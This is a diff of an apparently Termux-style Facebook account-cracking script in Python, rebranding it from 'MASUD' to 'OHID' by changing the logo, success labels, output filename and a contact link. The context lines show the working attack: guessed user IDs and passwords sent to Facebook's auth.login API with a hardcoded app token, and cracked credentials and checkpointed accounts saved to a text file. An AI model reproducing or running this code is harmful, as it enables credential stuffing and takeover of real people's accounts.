@@ -388,17 +388,18 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""
-\x1b[1;92m                 ______ ____                  
-\x1b[1;92m                |  ____|  _ \                 
-\x1b[1;92m                | |__  | |_) |                 
-\x1b[1;92m                |  __| |  _ <                 
-\x1b[1;92m                | |    | |_) |                 
-\x1b[1;92m _______      |_|___ |____/_ ______ _______ 
-\x1b[1;92m  |__   __|/\   |  __ \ / ____|  ____|__   __|  
-\x1b[1;92m     | |  /  \  | |__) | |  __| |__     | |   
-\x1b[1;92m     | | / /\ \ |  _  /| | |_ |  __|    | |   
-\x1b[1;92m     | |/ ____ \| | \ \| |__| | |____   | |   
-\x1b[1;92m     |_/_/    \_\_|  \_\\_____|______|  |_|   
+\x1b[1;92m─────────────────────────────────────────────────────────
+\x1b[1;92m─██████████████─██████──██████─██████████─████████████───
+\x1b[1;92m─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─
+\x1b[1;92m─██▒▒██████▒▒██─██▒▒██──██▒▒██─████▒▒████─██▒▒████▒▒▒▒██─
+\x1b[1;92m─██▒▒██──██▒▒██─██▒▒██──██▒▒██───██▒▒██───██▒▒██──██▒▒██─
+\x1b[1;92m─██▒▒██──██▒▒██─██▒▒██████▒▒██───██▒▒██───██▒▒██──██▒▒██─
+\x1b[1;92m─██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒██───██▒▒██───██▒▒██──██▒▒██─  ─██▒▒██──██▒▒██─██▒▒██████▒▒██───██▒▒██───██▒▒██──██▒▒██─
+\x1b[1;92m─██▒▒██──██▒▒██─██▒▒██──██▒▒██───██▒▒██───██▒▒██──██▒▒██─
+\x1b[1;92m─██▒▒██████▒▒██─██▒▒██──██▒▒██─████▒▒████─██▒▒████▒▒▒▒██─
+\x1b[1;92m─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─
+\x1b[1;92m─██████████████─██████──██████─██████████─████████████───
+\x1b[1;92m─────────────────────────────────────────────────────────
 
    \x1b[1;92m╔═════════════════════════════╗
    \x1b[1;92m║➣TOOL NAME : {Tergat Facebook id}                  ║
@@ -1278,15 +1279,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ MASUD-OK ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ OHID-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-MASUD-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-OHID-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ MASUD-OK ] %s | %s\033[0;92m         "%(uid, pw))
+				print("\r \033[0;92m[ OHID-OK ] %s | %s\033[0;92m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-MASUD-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-OHID-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1324,6 +1325,6 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://wa.me/01300143398?text=' + tks)
+		os.system('am start http://youtube.com/@ohid_yt?text=' + tks)
 		Subscraption()        
 Subscraption()
